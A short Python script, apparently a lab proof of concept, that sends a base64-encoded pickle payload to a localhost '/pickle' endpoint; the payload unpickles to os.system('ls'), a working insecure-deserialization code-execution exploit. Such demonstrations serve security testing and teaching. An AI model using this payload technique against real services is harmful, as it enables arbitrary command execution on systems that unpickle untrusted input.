import requests
import pickle
import base64
import os

url = "http://localhost:8000/pickle?msg='gASVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJsc5SFlFKULg=='"
msg=b'\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02ls\x94\x85\x94R\x94.'
response = requests.get(url)
print(response.text)